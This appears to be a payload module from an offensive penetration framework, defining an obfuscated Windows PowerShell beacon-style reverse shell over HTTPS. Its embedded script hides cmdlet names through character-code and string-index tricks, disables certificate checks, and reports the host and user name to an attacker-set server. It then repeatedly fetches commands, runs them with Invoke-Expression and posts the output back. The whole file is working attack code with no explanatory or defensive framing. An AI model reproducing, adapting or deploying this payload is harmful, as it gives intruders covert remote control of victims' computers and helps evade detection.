# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell IEX BlackJack https',
        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
        'Description' : 'An Https based beacon-like reverse shell that utilizes IEX',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
    }

    meta = {
        'handler' : 'blackjack',
        'type' : 'ps-iex-ssl',
        'os' : 'windows',
        'shell' : 'powershell.exe'
    }

    config = {
        'frequency' : 15
    }

    parameters = {
        'lhost' : None
    }

    attrs = {
        'obfuscate' : False,
        'encode' : True
    }

    data = '''& ([string]::join('', ( (97,100,100,45,116,121,112,101) |%{;$_;}|%{ ( [char][int] $_)})) |%{;$_;}| % {$($_)}) @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{;$($_);}|%{ ( [char][int] $_)})) |%{;$_;}| % {$_}) TrustAllCertsPolicy
$ConfirmPreference="None";$s=\'*LHOST*\';$i=\'*SESSIONID*\';$p=\'https://\';$v=& (("es9JryiIKWPU6nDm5Y-XMkfTR2EuBo0l8bA1FtZhQGCOcwNzvgqa4pd37HLVjSx")[7,13,48,29,21,0,18,24,0,1,37,20,0,37,39,29,54] -join '') -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{"*BLACKJACKID*"=$i};for (;;){$c=(& (("es9JryiIKWPU6nDm5Y-XMkfTR2EuBo0l8bA1FtZhQGCOcwNzvgqa4pd37HLVjSx")[7,13,48,29,21,0,18,24,0,1,37,20,0,37,39,29,54] -join '') -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*BLACKJACKID*"=$i});if ($c -ne \'None\') {$r=& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |%{;$($_);}|%{ ( [char][int] $($_))})) |%{;$_;}| % {$_}) $c -ErrorAction Stop -ErrorVariable e;$r=& (("rsXZHLet-8nV2fWRQjlAEGvkT340bcyUwpu9oSmMixdKYOaqI6FN1z7hgJ5DBPC")[45,34,7,8,37,7,0,40,10,56] -join '') -InputObject $r;$x=& (("es9JryiIKWPU6nDm5Y-XMkfTR2EuBo0l8bA1FtZhQGCOcwNzvgqa4pd37HLVjSx")[7,13,48,29,21,0,18,24,0,1,37,20,0,37,39,29,54] -join '') -Uri $p$s/*POSTRES* -Method POST -Headers @{"*BLACKJACKID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep *FREQ*}'''
